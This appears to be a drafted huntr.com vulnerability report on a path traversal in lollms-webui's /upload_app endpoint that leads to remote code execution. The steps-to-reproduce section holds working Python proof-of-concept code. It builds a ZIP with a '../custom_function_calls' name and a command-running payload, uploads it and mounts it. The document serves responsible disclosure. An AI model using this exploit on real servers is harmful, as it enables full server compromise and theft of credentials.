# Huntr.com Form Submission Data

## CVSS Fields (8 dropdowns)

| Field | Select Value |
|-------|--------------|
| Attack Vector (AV) | **Network** |
| Attack Complexity (AC) | **Low** |
| Privileges Required (PR) | **Low** |
| User Interaction (UI) | **None** |
| Scope (S) | **Unchanged** |
| Confidentiality Impact (C) | **High** |
| Integrity Impact (I) | **High** |
| Availability Impact (A) | **High** |

**CVSS Score**: 8.8 (High)
**CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

---

## Write-up Fields

### Title
```
Path Traversal in /upload_app leads to RCE via custom function injection
```

### Description
```
A critical Path Traversal vulnerability has been discovered in the lollms-webui application that allows authenticated attackers to achieve Remote Code Execution (RCE) by uploading malicious ZIP files to the /upload_app endpoint.

The vulnerability exists in lollms/server/endpoints/lollms_apps.py at line 340, where the `name` field from description.yaml is used directly in path operations without proper sanitization. This allows attackers to use path traversal sequences (../) in the application name to write files to arbitrary locations on the server.

Technical Details:
- The /upload_app endpoint accepts ZIP file uploads for custom applications
- The description.yaml file inside the ZIP contains a `name` field
- This name field is used to construct the destination path without sanitization
- By setting name to "../custom_function_calls/evil_func", attackers can escape the apps directory
- Once files are written to custom_function_calls/, the attacker can mount and execute arbitrary Python code
- This leads to full Remote Code Execution on the server

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (Score: 8.8 High)
```

### Steps to Reproduce
```
## Prerequisites
- lollms-webui running on port 9600 (default)
- Python 3 with: pip install requests websocket-client

## Step 1: Obtain client_id via WebSocket
The lollms-webui requires a valid client_id for API authentication:

```python
import websocket
import json
import time

client_id = None

def on_message(ws, message):
    global client_id
    data = json.loads(message)
    if "client_id" in str(data):
        cid = data.get("client_id") or data.get("data", {}).get("client_id")
        if cid:
            client_id = cid
            ws.close()

ws = websocket.WebSocketApp("ws://localhost:9600/ws", on_message=on_message)
import threading
t = threading.Thread(target=ws.run_forever)
t.daemon = True
t.start()
time.sleep(3)
```

## Step 2: Create malicious ZIP with path traversal payload
Create a ZIP file containing description.yaml with path traversal in the name field:

```python
import zipfile
import io

TRAVERSAL_NAME = "../custom_function_calls/evil_func"

DESCRIPTION_YAML = f'''
name: {TRAVERSAL_NAME}
description: "Malicious app"
version: "1.0"
'''

MALICIOUS_FUNCTION = '''
import os
def execute(**kwargs):
    result = os.popen("id && hostname").read()
    with open("/tmp/pwned_lollms", "w") as f:
        f.write(result)
    return {"status": "executed", "output": result}
'''

buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("description.yaml", DESCRIPTION_YAML)
    zf.writestr("function.py", MALICIOUS_FUNCTION)
```

## Step 3: Upload the malicious ZIP
```python
import requests

r = requests.post(
    "http://localhost:9600/upload_app",
    params={"client_id": client_id},
    files={"file": ("exploit.zip", buf, "application/zip")},
    timeout=15
)
print(f"Upload response: {r.status_code}")
```

## Step 4: Mount the malicious function
```python
r = requests.post(
    "http://localhost:9600/mount_function_call",
    json={
        "client_id": client_id,
        "function_category": "custom",
        "function_name": "evil_func"
    },
    timeout=10
)
```

## Step 5: Verify RCE
Check if /tmp/pwned_lollms was created on the server with command output.

Full PoC available at: [attach poc.py file]
```

### Impact
```
This vulnerability allows authenticated attackers to achieve full Remote Code Execution on the server:

**Confidentiality Impact (HIGH)**: Attackers can read any file accessible by the lollms process including:
- Configuration files with API keys and credentials
- User data and conversation history
- Custom models and training data
- Environment variables and secrets

**Integrity Impact (HIGH)**: Attackers can write/overwrite arbitrary files:
- Plant backdoors in application code
- Modify configurations
- Inject malicious custom functions
- Deface the application

**Availability Impact (HIGH)**: Attackers can cause denial of service:
- Delete critical application files
- Corrupt the database
- Kill the lollms process

**Business Impact**:
- Complete server compromise
- Data breach of all user information
- Supply chain attack vector affecting all users
- Potential lateral movement into internal network

CVSS Score: 8.8 (High)
```

### Permalink (Vulnerable Code Location)
```
https://github.com/ParisNeo/lollms-webui/blob/main/lollms/server/endpoints/lollms_apps.py#L340
```

### PoC File
Attach: `/Users/code/project/intel/results/poc.py`

Or create GitHub Gist and paste link:
```
https://gist.github.com/[YOUR_USERNAME]/[GIST_ID]
```

---

## Submission Checklist

- [ ] Repository: ParisNeo/lollms-webui (already filled)
- [ ] Package Manager: pip/npm (already filled)
- [ ] Version: latest (already filled)
- [ ] Vulnerability Type: Path Traversal (already filled)
- [ ] CVSS Score: 8.8 (8 fields to fill)
- [ ] Title: ✅ (copy from above)
- [ ] Description: ✅ (copy from above)
- [ ] Steps to Reproduce: ✅ (copy from above)
- [ ] Impact: ✅ (copy from above)
- [ ] Permalink: ✅ (paste URL)
- [ ] PoC File: ✅ (attach poc.py)
- [ ] Submit Report button
